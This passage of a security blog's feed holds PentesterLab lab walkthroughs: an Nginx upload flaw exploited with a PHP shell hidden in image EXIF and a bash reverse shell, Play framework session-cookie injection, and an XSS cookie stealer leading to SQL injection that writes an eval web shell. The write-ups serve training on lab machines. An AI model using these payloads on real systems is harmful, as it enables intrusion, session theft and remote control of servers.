</pre></td><td class='code'><pre><code class=''><span class='line'>echo -e &ldquo;HEAD /admin/uploads/1431253877.jpg HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n\r\n&rdquo; | nc 10.10.10.129 80</span></code></pre></td></tr></table></div></figure>
and
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo -e &ldquo;HEAD /admin/uploads/1431253877.jpg/test.php HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n\r\n&rdquo; | nc 10.10.10.129 80</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/fromsqltoshell2/4.png"></p>

<p>From the result above, we can see that the difference in the value of &ldquo;Content-Type&rdquo; between the two responses. the second response shows that the file has been interpreted as PHP code.</p>

<p>Now I inject the classic single-line php shell (&lt;?php system($_GET[&lsquo;cmd&rsquo;]); ?>) into an image by using &ldquo;exiftool&rdquo;</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exiftool &ldquo;-comment&lt;=shell.php&rdquo; img.jpg</span></code></pre></td></tr></table></div></figure></p>

<p>Then I set up NC on my Kali Linux to listen on port 5555, after uploaded the file and exploit the Nginx mis-configure vulnerability, I got a shell back.</p>

<p><img class="left" src="/downloads/fromsqltoshell2/5.png"></p>

<p>Then I use the following command to get a better shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/bash -i >&amp; /dev/tcp/10.10.10.131/4444 0>&amp;1</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/fromsqltoshell2/6.png"></p>

<p>Done.</p>

<h3>Code Review</h3>


<p>The vulnerable code is in the file stats.php
<figure class='code'><figcaption><span>stats.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">REMOTE_ADDR</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;];</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SERVER</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">HTTP_X_FORWARDED_FOR</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$ip</span><span class="o">=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">SERVER</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">HTTP_X_FORWARDED_FOR</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;];</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nv">$results</span><span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">stats</span> <span class="nx">where</span> <span class="nx">ip</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$results</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$results</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">ip</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])</span>
</span><span class='line'>        <span class="nb">mysql_query</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">UPDATE</span> <span class="nx">stats</span> <span class="nx">set</span> <span class="nb">count</span><span class="o">=</span><span class="nb">count</span><span class="o">+</span><span class="mi">1</span> <span class="nx">where</span> <span class="nx">ip</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'>      <span class="k">else</span>
</span><span class='line'>        <span class="nb">mysql_query</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">INSERT</span> <span class="nx">INTO</span> <span class="nx">stats</span> <span class="p">(</span><span class="nx">ip</span><span class="p">,</span> <span class="nb">count</span><span class="p">)</span> <span class="nx">VALUES</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span><span class="mi">1</span><span class="p">);</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>As we can see above, there is no input validation or filter against the value of &ldquo;<font color='red'>HTTP_X_FORWARDED_FOR</font>&rdquo; which is saved in variable &ldquo;ip&rdquo; and used in SQL statement directly to make the vulnerability happened.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Play Session Injection]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-play-session-injection/"/>
    <updated>2015-05-09T07:34:13-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-play-session-injection</id>
    <content type="html"><![CDATA[<p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit XSS and SQL injection vulnerabilities. More information and ISO download please check <a href='https://ptl.io/play_session_injection.iso'>here</a>. The <a href='https://www.pentesterlab.com/exercises/play_session_injection/course'>official course</a> is highly recommended to read, which explains how the vulnerabilities happened and the ways to exploit.</p>

<p>Difficulty: 3 / 5</p>

<h2>Links</h2>


<p>watch video online:
<iframe src='http://player.vimeo.com/video/103324009?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Interacted with the web server, found the (Cross Site Script) XSS vulnerable point. [Firefox]</li>
<li>Register two new accounts which username are test and test2, analyze both session cookies to figure out the cookie’s construction rules. Inject evil codes into the session cookie to bypass the validation schedule. [firebug / Burp proxy]</li>
<li>For goal one, inject “admin:1” to login with administration privilege. For goal two, inject “user:admin1” to login as admin user “admin1” with administration privilege. [Burp proxy]</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://getfirebug.com/'>Firebug</a></li>
<li><a href='http://portswigger.net/burp/'>Burp suite</a></li>
</ul>


<h2>Walkthrough</h2>


<p>By reading the training <a href='https://www.pentesterlab.com/exercises/play_session_injection/course'>pdf</a>, we know that there is a session injection in Play framework. (In this exercise, we have two goals to achieve. First one is to login as anyone but have administration privilege; Second one is to login as administrator name is “admin1”).</p>

<h3>Find the Play session cookie</h3>


<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. Upon viewing the page, the attacker know that this there are two goals need to be achieved. First one is create a user with admin privilege and the second one is to login as the user “admin1”. On the top left hand side, is the navigation menu to “Register”(which asks the attacker to register a new account), “Login”(which asks the attacker to login). The attacker tried to register a new account which the name is “test”, then run Burp proxy and login with the “test” account. After checking the request intercepted by Burp proxy, the attacker found that the session information is saved in the cookie called “PLAY_SESSION”. The cookie value is in the following format:<br>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PLAY_SESSION=xxx(some hash code)xxx%00&lt;strong>AT%3Axxx(authenticityToken)xxx%00%00user%3Atest%00</span></code></pre></td></tr></table></div></figure>
In order to analyze the session cookie, the attacker register another new account which name is &ldquo;test2&rdquo; and the session cookie value is
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PALY_SESSION=xxx(some hash code)xxx%00&lt;/strong>AT%3Axxx(authenticityToken)xxx%00%00user%3Atest2%00</span></code></pre></td></tr></table></div></figure>
Here we can see that the username would be an injection point. And the encoding format is “<font color='blue'>%00key%3Avalue%00</font>” (here %3A is URL encoded “:” and %00 means NULL for termination).</p>

<h3>First goal is to login as anyone but have admin privilege</h3>


<p>In order to login as any user (here the attacker choose user “test2”) with admin privilege, the attacker have to inject evil code into the Play session. As we found that username is an injection point in the session, the attacker need to construct the Play session like this:</p>

<p><font color='blue'>PLAY_SESSION=xxx(hash code)xxx%00__AT%3Axxx(authenticityToken)xxx%00%00user%3A<font color='red'>test2%00%00admin%3A1</font>%00</font></p>


<p>Here admin%3A1 means “admin:1” which usually indicates admin privilege). In order to construct the above Play session, the attacker have to register a new account which user name is “<font color='red'>test2%00%00admin%3A1</font>”. (note: Burp proxy is needed here to fulfill this injection.</p>

<h3>Second goal is to login as admin user “admin1”</h3>


<p>Same as above, in order to login as admin user “admin1”, the attacker have to inject evil code into the Play session. The attacker need to construct the Play session like this:</p>

<p><font color='blue'>PLAY_SESSION=xxx(hash code)xxx%00__AT%3Axxx(authenticityToken)xxx%00%00user%3A<font color='red'>test2%00%00user%3Aadmin1</font>%00</font></p>


<p></p>

<p>In order to construct the above Play session, the attacker have to register a new account which user name is “<font color='red'>test2%00%00user%3Aadmin1</font>”. (note: Burp proxy is needed here to fulfill this injection)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] XSS and MySQL File]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-xss-and-mysql-file/"/>
    <updated>2015-05-09T01:28:19-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-xss-and-mysql-file</id>
    <content type="html"><![CDATA[<p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit XSS and SQL injection vulnerabilities. More information and ISO download please check <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file'>here</a>. The <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file/course'>official course</a> is highly recommended to read, which explains how the vulnerabilities happened and the ways to exploit.</p>

<p>Difficulty: 2 / 5</p>

<h2>Links</h2>


<p>watch video online:
<iframe src='http://player.vimeo.com/video/114390804?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering [whatweb]</li>
<li>Web file system structure detection [DirBuster]</li>
<li>Interacted with the web server, found the (Cross Site Script) XSS vulnerable point. [Firefox]</li>
<li>Set up the attacker’s server in order to Exploit the XSS vulnerability and get admin session cookie. [socat]</li>
<li>After obtain the admin session cookie, log in as administrator and then found SQL injection vulnerable point.</li>
<li>Exploit SQL injection to upload web shell.</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='http://www.morningstarsecurity.com/research/whatweb'>whatweb</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://www.dest-unreach.org/socat/'>socat</a></li>
</ul>




<h2>Walkthrough</h2>


<p>By reading the official course <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file/course'>pdf</a>, we know that we need to find and exploit a XSS vulnerability to log in as admin. After that, we need to find and exploit a MySQL injection vulnerability in order to upload webshell and control the target server.</p>

<h3>Find and Exploit the XSS vulnerability</h3>


<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. Upon viewing the page, the attacker know that there are two goals need to be achieved. First one is log in as administrator and then upload webshell into the target server.</p>

<p>After browsing around the target web site, the attacker found the comment system might be vulnerable to XSS. The attacker try to test if there are XSS vulnerability by using &ldquo;<font color='red'>1337′&rdquo;>&lt;</font>“. The result is a little excited. the server end dose not filter special characters. So the attacker just exploit the XSS and obtain the cookie with admin privilege.</p>

<p>write the following XSS exploit code into the comments:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;script&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&quot;http://192.168.1.129/?&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">+</span><span class="s1">&#39;&quot;/&gt;&#39;</span><span class="p">);</span> <span class="nt">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Set up the attacker’s machine to listen port 80 by using followed socat command.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>socat TCP-LISTEN:80,reuseaddr,fork –
</span></code></pre></td></tr></table></div></figure></p>

<p>The attacker will receive admin session cookie as soon as the administrator open the comments page.</p>

<h3>Exploit MySQL injection vulnerability and uploading webshell</h3>


<p>SQL Injection point:</p>

<p><font color='red'>http://192.168.1.149/admin/edit.php?id=2</font></p>


<p>Try single quote:</p>

<p><font color='red'>http://192.168.1.149/admin/edit.php?id=2′</font></p>


<p>Results:<br>
Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in <font color='red'>/var/www/classes/post.php</font> on line 111 Notice: Undefined variable: post in /var/www/classes/post.php on line 115</p>

<p>Now the attacker know the target web site’s absolute path is “/var/www/”</p>

<p>Detect backend DB information</p>

<p>
attacking code:<br>
http://192.168.1.149/admin/edit.php?id=2 order by 4 — – (OK)<br>
http://192.168.1.149/admin/edit.php?id=2 order by 5 — – (ERROR)<br><br>
http://192.168.1.149/admin/edit.php?id=-2 union select 1,@@version,user(),4
</p>


<p>Results:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Mysql Version: 5.1.72-2
</span><span class='line'>current DB user: root@localhost</span></code></pre></td></tr></table></div></figure></p>

<p>Due to MySQL is now runnnig by root, the attacker will grain root privilege.</p>

<p>Then the attacker is going to upload webshell.</p>

<p>attacking code：
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.1.149/admin/edit.php?id=-2">http://192.168.1.149/admin/edit.php?id=-2&lt;/a> union select 1,2,&ldquo;&lt;?php @eval($_POST[&lsquo;chopper&rsquo;])?>&rdquo;,4 into outfile &ldquo;/var/www/css/t2.php&rdquo; — –</span></code></pre></td></tr></table></div></figure>
attacking code(URL encoded)：
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20%E2%80%93%20-e">http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20%E2%80%93%20-e&lt;/a></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
